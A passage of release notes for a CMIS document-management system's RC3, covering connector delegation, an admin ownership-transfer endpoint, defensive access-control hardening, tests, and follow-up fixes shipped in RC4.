> in a separate PR — see "Known pre-existing follow-ups" at the end
> of this section.

### Upgrade

No CouchDB migration required — RC3 adds no new views, patches, or
type definitions; only JSON fields with safe defaults. See
[**Migration safety**](#migration-safety-rc3) below for the full
upgrade-time round-trip analysis. After deploying RC3:

1. **Existing admin-owned profiles** stay admin-managed. If a folder
   owner should take over a profile, use
   `POST /v1/admin/import-profiles/{id}/ownership` with
   `{"mode": "delegated", "createdByUserId": "<owner>"}` — admin only.
   Before transferring, verify that:
   - the target connector has `delegated=true` AND the profile's
     target folder is within its `allowedFolderIds` (or it sets
     `delegateAllFolders=true`),
   - the profile's `allowedConnectorIds` is non-empty AND each
     connector in it is delegated to the new owner for the target
     folder,
   - the profile's `defaultConnectorId` (if any) is contained in
     `allowedConnectorIds`,
   - the new owner effectively holds `cmis:all` on the target folder.
   Any of these failing returns a 400/403 with a structured
   `denialReason` and the profile is left untouched (the transfer is
   transactional from the caller's point of view).

   To move a profile back to admin management, POST the same endpoint
   with `{"mode": "admin"}` — clears `delegated`, leaves other fields
   alone.

2. To delegate a connector, open Integration Settings → Connectors →
   edit the connector → enable **委譲設定** and set
   `allowedFolderIds`. Optionally restrict by `allowedPrincipalIds`.

3. Notify folder owners — they'll see the import-profile and
   manual-ingest tabs under Integration Settings, plus a Browse
   folder-picker in the targetFolderId field.

### Security hardening (everything below is automatic)

- Connector credentials never reach non-admin clients. `/summary`
  returns a slim DTO with no `credentialRef` / `webhookSecret` /
  `endpoint` / `tenantId` / scope fields.
- Effective `cmis:all` evaluation uses `PrincipalService` group
  expansion + the repository's Anyone principal. Fail-closed on group
  lookup or ACL calculation failures.
- Folder containment uses ID-based ancestor walks (no path-prefix
  matching), so renames and moves don't false-match.
- TOCTOU defence: profile PUT re-checks `cmis:all` and connector scope
  on BOTH the existing and the new target folder so an attacker can't
  retarget a delegated profile they don't own.
- Runtime ingest re-evaluates the gate on every call — revoking a
  connector's delegation immediately stops in-flight profiles from
  using it.
- Scheduler defensively skips any record whose `delegated=true` even
  if `schedulerEnabled=true` slipped in via direct CouchDB write
  (`logs WARN once per profile per JVM lifetime`, then DEBUG).
- Required Spring dependencies for the gate (`IngestAuthorizationService`,
  `ConnectorDefinitionService`, `ImportProfileDefinitionService`) —
  bean missing means deny, never silent admin fall-through.

### Known limitations (deferred to v2)

- **Scheduled delegated profiles**: not supported.
  `schedulerEnabled=true` on a delegated profile is rejected at both
  the create/update API and at the scheduler poll loop. See
  [`docs/design/connector-delegation.md`](docs/design/connector-delegation.md)
  §12.1 for the full v2 pre-design — CallContext synthesis,
  per-tick ACL re-evaluation, creator deactivation policy, new
  `DenialReason` entries, and the property gates that govern the
  feature.
- ~~**Folder picker tree**~~: **shipped**. See "New in this RC" below.

### New in this RC (closed earlier "limitations")

- **Profile ownership transfer endpoint** (was: "delete + recreate
  only") — `POST /v1/admin/import-profiles/{id}/ownership` with
  `{mode: "delegated", createdByUserId: "alice"}` or
  `{mode: "admin"}`. Admin-only; re-validates that the new owner
  effectively holds `cmis:all`, that every connector in the
  profile's `allowedConnectorIds` is delegated to them, and that
  `defaultConnectorId` (if set) is contained in `allowedConnectorIds`,
  before flipping the flag. Refuses with the same `DenialReason`
  codes used elsewhere. Every denial — including
  `TARGET_FOLDER_UNRESOLVABLE`,
  `EMPTY_ALLOWED_CONNECTORS`, `DEFAULT_CONNECTOR_NOT_IN_ALLOWED`,
  `CMIS_ALL_REQUIRED`, `CONNECTOR_NOT_DELEGATED`, `UNKNOWN_CONNECTOR`,
  `BLANK_CONNECTOR_ENTRY` — flows through `auditTransferDenial`, so
  the audit trail captures `transferTo` + `newOwnerUserId` +
  `denialReason` even when the transfer is rejected before any DB
  write.
- **Connector PUT partial-payload protection** (was: "admin PUT
  omitting allowedFolderIds clears it"). List fields
  (`allowedFolderIds`, `allowedPrincipalIds`) follow
  null=preserve / `[]`=explicit clear semantics. Primitive flags
  still require an explicit value — admin must always send the
  intended boolean.
- **Folder picker tree** (was: "type IDs by hand"). The Browse
  button in the `targetFolderId` field opens a lazy-expanded CMIS
  folder tree. The picker shows folders the user can read (Browser
  Binding default); when a folder is selected the picker probes
  `/v1/admin/connectors/summary` against it — 403 = no `cmis:all`,
  Confirm stays disabled; 200 = green check and Confirm enables.
  Same picker is available to admin as a quality-of-life
  convenience (admin can pick any folder regardless of cmis:all).

### Testing

- 165+ ingest unit tests cover the authorization service, controller
  gates, runtime gates, scheduler defence, and cap-property handling.
- 21 API E2E tests against a live deployment cover admin / delegated
  user / non-delegated user × CRUD + execute + TOCTOU scenarios.
- All tests pass on every RC3 commit including the latest
  hardening rounds.

### Known pre-existing follow-ups (closed in RC4)

Surfaced by the RC3 migration / view-registration static review and
**all four shipped in RC4** (see top of this file). The table below
is retained for traceability.

| ID | Severity | Summary | Status |
|---|---|---|---|
| R1 | High | `NemakiPatchInitializationListener.patchBeanNames` (fallback path) is asymmetric with `CMISPostInitializer.cmisPatchList` (primary path). 9 patches are missing from the fallback list; 8 of those have no top-level `bean id="..."` in `patchContext.xml`. | ✅ Fixed in RC4 — auto-collect from Spring context, 8 missing bean ids added |
| R2 | Medium | Mango `_find` queries against `nemaki_conf` have no registered Cloudant index. Fine at current scale, noticeable at 10k+. | ✅ Fixed in RC4 — `Patch_IngestMangoIndexes` registers 7 compound indexes |
| R3 | Medium | `StartupProbeService.REQUIRED_VIEWS_MAIN = 38` is hard-coded; the shipped `bedroom_init.dump` actually contains 40 views. | ✅ Fixed in RC4 — dump-derived name-set subset check |
| R4 | Low | `Patch_StandardCmisViews` is registered both in `cmisPostInitializer.cmisPatchList` and `patchService.patchList`. Startup log shows the patch entry twice. | ✅ Fixed in RC4 — removed from `patchService.patchList` |

### References

- Design: [`docs/design/connector-delegation.md`](docs/design/connector-delegation.md)
- Operator runbook: same doc §8 + Help page → 連携設定 — 外部
  インジェスト → 委譲を運用する
- Audit reasons: same doc §10 (`DenialReason` reference table)
- Multi-replica posture: [`docs/MULTI-REPLICA-DEPLOYMENT.md`](docs/MULTI-REPLICA-DEPLOYMENT.md)
  (delegation is stateless — no extra requirements beyond the existing
  single-replica posture)

---

## Prior releases

See the per-RC history block in
[`docs/history/development-log.md`](docs/history/development-log.md)
for RC1 through RC14 (and RC15/RC3 detail). It was moved there verbatim from
`CLAUDE.md` on 2026-07-26.
